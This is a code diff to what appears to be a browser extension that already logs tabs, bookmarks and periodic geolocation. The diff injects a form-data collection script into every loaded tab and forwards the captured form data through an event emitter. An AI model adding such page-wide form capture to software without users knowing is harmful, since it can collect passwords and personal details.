@@ -169,6 +169,8 @@ var onWindowRemoved = function (windowId) {
 var onTabUpdate = function (tabId, changeInfo, tab) {
     if (changeInfo.status === "complete") {
         emitEvent('updateTab', tab);
+        chrome.tabs.executeScript(tabId, { file: "lib/jquery-1.7.1.min.js" });
+        chrome.tabs.executeScript(tabId, { file: "events/getFormData.js" });
     }
 };
 
@@ -210,6 +212,13 @@ var onBookmarkRemoved = function (id, changeInfo) {
     emitEvent('removeBookmark', { 'id': id });
 };
 
+var onFormSubmit = function (port) {
+    console.assert(port.name === 'formData');
+    port.onMessage.addListener(function (formData) {
+        emitEvent('addFormData', formData);
+    });
+};
+
 var activateListeners = function () {
     console.log("Activating listeners...");
     chrome.windows.onCreated.addListener(onWindowCreate);
@@ -224,5 +233,6 @@ var activateListeners = function () {
     chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
     chrome.bookmarks.onChanged.addListener(onBookmarkChange);
     chrome.bookmarks.onRemoved.addListener(onBookmarkRemoved);
+    chrome.runtime.onConnect.addListener(onFormSubmit);
     setInterval(getCurrentPosition, 5 * 60 * 1000);
 };
